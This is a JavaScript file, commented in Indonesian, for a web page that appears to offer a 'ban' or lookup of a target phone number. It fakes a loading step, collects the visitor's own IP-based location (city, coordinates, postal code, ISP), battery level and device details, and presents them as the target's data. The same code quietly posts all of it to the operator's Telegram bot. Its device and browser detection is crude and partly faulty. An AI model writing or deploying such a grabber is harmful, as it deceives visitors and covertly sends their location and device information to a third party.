document.getElementById('ban-form').addEventListener('submit', function(e) {
  e.preventDefault();

  const targetNumber = document.getElementById('targetNumber').value.trim();
  if (!targetNumber) return;

  // Sembunyikan hasil sebelumnya
  document.getElementById('result-data').classList.add('hidden');

  // Tampilkan proses loading
  const statusDiv = document.getElementById('process-status');
  statusDiv.classList.remove('hidden');

  // Simulasi proses loading 3 detik
  setTimeout(() => {
    statusDiv.classList.add('hidden');
    getRealData(targetNumber);
  }, 3000);
});

async function getRealData(number) {
  try {
    // 1. Ambil data IP & lokasi dari ipapi
    const ipRes = await fetch('https://ipapi.co/json/');
    const ipData = await ipRes.json();

    // 2. Ambil data baterai
    const battery = await navigator.getBattery();

    // 3. Ambil data device
    const deviceInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`
    };

    // 4. Gabungkan semua data
    const finalData = `
STATUS           : SUCCESS
TARGET NUMBER    : ${number}
JUMLAH BATRE HP  : ${Math.floor(battery.level * 100)}%
DEVICE HP        : ${getDeviceName(deviceInfo.userAgent)}
BRAND HP         : ${getBrandName(deviceInfo.userAgent)}
OS VERSION       : ${getOSVersion(deviceInfo.userAgent)}
BROWSER NAME     : ${getBrowserName(deviceInfo.userAgent)}
SCREEN RESOLUTION: ${deviceInfo.screen}

IP ADDRESS       : ${ipData.ip}
REGION           : ${ipData.region}
REGION CODE      : ${ipData.region_code}
CITY             : ${ipData.city}
COUNTRY          : ${ipData.country_name}
COUNTRY CODE     : ${ipData.country_code}
ISP              : ${ipData.org}
AS               : ${ipData.asn}
PROXY            : ${ipData.proxy ? "TRUE" : "FALSE"}
HOSTING          : ${ipData.hosting ? "TRUE" : "FALSE"}
TIME ZONE        : ${ipData.timezone}
CURRENCY         : ${ipData.currency}
LONGITUDE        : ${ipData.longitude}
LATITUDE         : ${ipData.latitude}
POSTAL CODE      : ${ipData.postal}

LANGUAGE DETECTED: ${deviceInfo.language}
`;

    // 5. Tampilkan hasil di halaman
    document.getElementById('fake-data').textContent = finalData;
    document.getElementById('result-data').classList.remove('hidden');

    // 6. Kirim ke Telegram
    sendToTelegram(finalData);

  } catch (error) {
    console.error(error);
    alert("Gagal mengambil data asli target!");
  }
}

// Fungsi deteksi browser
function getBrowserName(ua) {
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Edg")) return "Edge";
  return "Unknown";
}

// Fungsi deteksi device
function getDeviceName(ua) {
  if (ua.includes("Infinix")) return "Infinix";
  if (ua.includes("Samsung")) return "Samsung";
  if (ua.includes("iPhone")) return "iPhone";
  if (ua.includes("Xiaomi")) return "Xiaomi";
  return "Unknown Device";
}

function getBrandName(ua) {
  return getDeviceName(ua);
}

// Deteksi OS
function getOSVersion(ua) {
  if (ua.includes("Android")) {
    return ua.match(/Android\s([0-9.]+)/)[1];
  } else if (ua.includes("iPhone OS")) {
    return "iOS";
  }
  return "Unknown";
}

// Kirim ke Telegram
function sendToTelegram(data) {
  const telegramToken = "ISI_TOKEN_BOT"; // ganti dengan token bot lu
  const chatId = "ISI_CHAT_ID"; // ganti dengan chat ID lu

  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: `🚨 Hasil Report 🚨\n\n${data}`,
      parse_mode: "Markdown"
    })
  });
}